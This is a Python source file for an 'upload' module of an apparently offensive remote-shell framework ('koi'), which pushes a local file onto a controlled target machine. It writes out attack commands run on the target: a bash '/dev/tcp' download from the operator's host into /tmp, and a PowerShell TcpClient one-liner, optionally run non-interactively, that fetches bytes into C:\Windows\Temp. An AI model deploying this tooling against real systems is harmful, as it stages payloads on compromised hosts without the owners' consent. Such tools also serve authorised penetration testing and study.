from __future__ import annotations

import os
import select
import time

from koi.modules.blueprint import KoiModule
from koi.utils.tcp import get_local_ip, spawn_send_server


class UploadModule(KoiModule):
    name = "upload"
    description = "Upload a local file to the target via a dedicated TCP connection."
    usage = "upload <id> <local_path> [-o <remote_path>]"
    category = "File transfer"
    platform = ["linux", "windows_ps"]
    arguments = [
        {"flags": ["local_path"], "help": "Path of the local file to upload"},
        {"flags": ["-o", "--output"], "default": None, "help": "Remote destination path"},
    ]

    def run(self) -> None:
        local_path  = self.args.local_path
        local_ip    = get_local_ip(self.session.addr[0])
        os_type     = self.session.os_type
        basename    = os.path.basename(local_path)

        if os_type == "linux":
            default_remote = f"/tmp/{basename}"
        else:
            default_remote = f"C:\\Windows\\Temp\\{basename}"

        remote_path = self.args.output or default_remote

        if not os.path.isfile(local_path):
            self.err(f"Local file not found: {local_path}")
            return

        with open(local_path, "rb") as f:
            raw = f.read()

        total = len(raw)
        bar = self.ui.ProgressBar(total=total)
        port, thread, errors = spawn_send_server(raw, timeout=30, on_progress=bar.update)

        self.status(f"Uploading {local_path}, {remote_path} ({total} bytes)…")

        if os_type == "linux":
            self.exec(
                f"cat < /dev/tcp/{local_ip}/{port} > {remote_path}",
                timeout=30,
            )
        else:
            ps_cmd = (
                f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
                f"$_s=$_c.GetStream();"
                f"$_f=[IO.File]::OpenWrite('{remote_path}');"
                f"$_b=New-Object byte[] 65536;"
                f"while(($_n=$_s.Read($_b,0,$_b.Length))-gt 0){{$_f.Write($_b,0,$_n)}};"
                f"$_f.Close();$_c.Close()"
            )

            if self.session.upgraded:
                self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
                time.sleep(0.3)
                r, _, _ = select.select([self.session.conn], [], [], 1.0)
                if r:
                    self.session.conn.recv(4096)
            elif os_type == "windows_ps":
                self.sendline(ps_cmd)
            else:
                escaped = ps_cmd.replace('"', '\\"')
                self.sendline(f'powershell -NoProfile -NonInteractive -c "{escaped}"')

        thread.join(timeout=30)
        bar.done()
        print()

        if errors:
            self.err(f"Transfer failed: {errors[0]}")
            return

        self.box("Upload complete", {
            "local path":  os.path.abspath(local_path),
            "remote path": remote_path,
            "size":        f"{total} bytes  ({total/1024:.1f} KB)",
        })
